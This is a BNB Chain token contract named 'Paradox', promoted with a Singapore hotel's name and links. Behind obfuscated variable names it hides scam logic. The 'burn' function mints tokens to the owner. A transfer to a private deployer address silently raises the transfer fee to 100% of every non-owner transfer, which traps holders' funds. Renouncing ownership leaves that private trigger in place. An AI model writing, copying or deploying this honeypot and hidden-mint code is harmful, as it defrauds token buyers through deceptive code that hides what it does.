/**
 *Submitted for verification at BscScan.com on 2022-11-29
*/

/*
    Paradox Hotel In Singapore V1
    Best Crypto Hotel In Singapore
    Huobi host in Paradox Hotel for all web3 event!
    https://www.facebook.com/paradoxmerchantcourt
    https://www.instagram.com/paradoxmerchantcourt
    https://sg.linkedin.com/company/paradox-singapore-merchant-court-at-clarke-quay
*/
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.6;
contract Paradox {
uint256 public  IOteQE = 1000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 public  XihuXJ = 10000000000000000;
address public  CSAQAl = address(0);
address private  mrYrLp = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  tgMFeN = 10000000000000000000000000000;
address public  urmknA = address(0);
uint256 public  eQynnQ = 100000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  xLVVMz = address(0);
uint256 public  RjYhVF = 100000000000000000;
address public  nnGhiE = address(0);
uint256 public constant ZjhQWT = 9+1;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  CtVVix = 10000000000000000000;
address public owner;
uint8 public constant decimals = 18;
uint256 private  WluyvN = 10000000000000;
uint256 public  fggvUu = 100000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address public  GKYNGv = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
string public  symbol = "Paradox";
uint256 public  wHAKjc = 100000000000000000000000;
string public  name = "Paradox";
address public  QfUgOW = address(0);
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
constructor () {
mrYrLp = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "dntpgY");
require(to != address(0), "dntpgY");
require(amount <= balanceOf[from], "dntpgY");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* ZjhQWT/WluyvN ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==mrYrLp){
WluyvN = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}

}